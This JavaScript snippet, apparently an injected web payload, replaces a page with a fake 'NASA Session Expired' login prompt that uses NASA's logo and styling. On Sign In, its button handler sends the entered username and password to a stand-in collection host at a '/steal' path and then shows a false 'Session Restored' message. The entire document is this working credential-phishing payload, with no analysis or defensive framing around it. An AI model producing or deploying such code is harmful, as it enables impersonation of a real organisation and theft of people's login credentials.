document.open();
document.write(`
<!DOCTYPE html>
<html>
<head>
  <title>NASA Security Alert</title>
  <style>
    body {
      margin: 0;
      background: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-family: Arial, sans-serif;
    }
    .box {
      background: #1a1a1a;
      border: 2px solid #fc3d21;
      border-radius: 12px;
      padding: 40px;
      text-align: center;
      max-width: 500px;
    }
    h1 { color: #fc3d21; }
    p { color: #fff; }
    input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 6px;
      border: none;
      font-size: 14px;
    }
    button {
      background: #fc3d21;
      color: white;
      border: none;
      padding: 12px 30px;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="box">
    <img src="https://www.nasa.gov/wp-content/themes/nasa/assets/images/nasa-logo.svg" 
         width="80" style="margin-bottom:20px"/>
    <h1>🔒 NASA Session Expired</h1>
    <p>Your session has expired. Please re-enter your credentials to continue.</p>
    <input type="text" placeholder="NASA Username / Email" id="u"/>
    <input type="password" placeholder="Password" id="p"/>
    <button onclick="
      fetch('https://YOUR-WEBHOOK.site/steal?u='+document.getElementById('u').value+'&p='+document.getElementById('p').value);
      document.querySelector('.box').innerHTML='<h2 style=color:#0f0>✓ Session Restored</h2>';
    ">Sign In</button>
  </div>
</body>
</html>
`);
document.close();
